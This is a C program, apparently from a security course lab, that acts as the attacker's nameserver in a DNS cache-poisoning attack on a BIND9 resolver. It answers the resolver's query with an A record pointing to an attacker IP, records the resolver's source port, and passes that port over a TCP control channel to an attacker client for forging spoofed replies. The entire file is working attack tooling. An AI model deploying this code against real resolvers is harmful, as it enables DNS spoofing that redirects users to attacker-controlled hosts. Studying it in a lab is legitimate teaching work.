#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ldns/ldns.h>

const char* ATTACKER_NS_IP = "192.168.1.201";

#define DNS_PORT 53
#define CONTROL_PORT 5000
#define MAX_DNS_PACKET 2048

// Open TCP control channel from attacker-ns to attacker-client
int open_tcp_connection(void) {
    // create a TCP socket for IPv4
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        exit(1);
    }

    // use socket options and add flags as required
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt,
    sizeof(opt)) < 0) {
        close(sockfd);
        exit(1);
    }
    opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt,
    sizeof(opt)) < 0) {
        close(sockfd);
        exit(1);
    }

    // create the ip and port address struct the server listens to
    struct sockaddr_in addr = {0}; // struct to hold IP, port and address family (IPv4)
    addr.sin_family = AF_INET; // IPv4 IP family
    addr.sin_port = htons(CONTROL_PORT); // set port number to listen on
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // accept connections from any IP

    // binding socket to IP and port
    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        exit(1);
    }

    // put socket in listening mode
    if (listen(sockfd, 1) < 0) {
        close(sockfd);
        exit(1);
    }

    // accept incoming connection (blocks execution until there is a client connection)
    int client_fd = accept(sockfd, NULL, NULL);
    if (client_fd < 0) {
        close(sockfd);
        exit(1);
    }

    close(sockfd);

    return client_fd;
}

int create_dns_socket(void) {
    // create the UDP socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        exit(1);
    }

    // create the address struct
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; // IPv4
    addr.sin_port = htons(DNS_PORT); // set port to DNS port - 53
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Accept UDP packets from any IP

    // bind socket to port 53
    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        exit(1);
    }
    return sockfd;
}


void send_dns_response(int dns_sock, struct sockaddr_in *client_addr,
                       socklen_t addr_len, unsigned char *buffer, ssize_t n) {
    ldns_pkt *query_pkt = NULL;

    // parse the incoming query
    ldns_status status = ldns_wire2pkt(&query_pkt, buffer, (size_t)n);
    if (status != LDNS_STATUS_OK) {
        return;
    }

    // get the TXID from the query
    uint16_t query_id = ldns_pkt_id(query_pkt);

    // get the question section
    ldns_rr_list *questions = ldns_pkt_question(query_pkt);
    if (!questions || ldns_rr_list_rr_count(questions) == 0) {
        ldns_pkt_free(query_pkt);
        return;
    }

    ldns_rr *question_rr = ldns_rr_list_rr(questions, 0);
    ldns_rdf *qname = ldns_rr_owner(question_rr);

    // create response packet
    ldns_pkt *response_pkt = ldns_pkt_new();
    if (!response_pkt) {
        ldns_pkt_free(query_pkt);
        return;
    }

    // set response flags
    ldns_pkt_set_id(response_pkt, query_id);
    ldns_pkt_set_qr(response_pkt, 1); // this is a response
    ldns_pkt_set_aa(response_pkt, 1); // authoritative answer
    ldns_pkt_set_rd(response_pkt, ldns_pkt_rd(query_pkt)); // copy RD flag from query
    ldns_pkt_set_ra(response_pkt, 0); // recursion not available
    ldns_pkt_set_opcode(response_pkt, LDNS_PACKET_QUERY);

    // add question section (copy from query)
    ldns_rr *question_copy = ldns_rr_clone(question_rr);
    if (question_copy) {
        ldns_pkt_push_rr(response_pkt, LDNS_SECTION_QUESTION, question_copy);
    }

    const uint32_t TTL = 300;
    // create A record answer for www.attacker.cybercourse.example.com
    ldns_rr *answer_rr = ldns_rr_new();
    ldns_rr_set_owner(answer_rr, ldns_rdf_clone(qname));
    ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A);
    ldns_rr_set_class(answer_rr, LDNS_RR_CLASS_IN);
    ldns_rr_set_ttl(answer_rr, TTL);

    // create A record data for the response
    ldns_rdf *rdata = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, ATTACKER_NS_IP);
    ldns_rr_push_rdf(answer_rr, rdata);
    ldns_pkt_push_rr(response_pkt, LDNS_SECTION_ANSWER, answer_rr);

    // convert response to wire format
    uint8_t *response_wire = NULL;
    size_t response_size = 0;
    status = ldns_pkt2wire(&response_wire, response_pkt, &response_size);

    if (status == LDNS_STATUS_OK && response_wire) {
        // Send response back to BIND9
        sendto(dns_sock, response_wire, response_size, 0,
               (struct sockaddr *)client_addr, addr_len);
        free(response_wire);
    }

    ldns_pkt_free(response_pkt);
    ldns_pkt_free(query_pkt);
}

void capture_and_forward_bind9_port(int dns_sock, int control_fd) {
    struct sockaddr_in client_addr; // address struct of client (in big-endian)
    socklen_t len = sizeof(client_addr);
    unsigned char buffer[MAX_DNS_PACKET]; // DNS packet buffer

    // receive DNS query
    ssize_t n = recvfrom(
        dns_sock,
        buffer,
        sizeof(buffer),
        0,
        (struct sockaddr *)&client_addr,
        &len
    );

    if (n < 0) {
        exit(1);
    }

    uint16_t resolver_port = ntohs(client_addr.sin_port);

    // send DNS response back to BIND9
    send_dns_response(dns_sock, &client_addr, len, buffer, n);

    if (write(control_fd, &resolver_port, sizeof(resolver_port)) != sizeof(resolver_port)) {
        close(control_fd);
        exit(1);
    }
}


int main(void) {
    // open a TCP connection to the attacker client
    int control_fd = open_tcp_connection();

    // create a UDP socket bound to port 53 (to listen to BIND9's DNS queries)
    int dns_sock = create_dns_socket();

    // wait for a DNS query from the BIND9 recursive server,
    // extract its port and send to the attacker client
    capture_and_forward_bind9_port(dns_sock, control_fd);

    // close TCP socket
    close(control_fd);


    //close UDP socket
    close(dns_sock);

    return 0;
}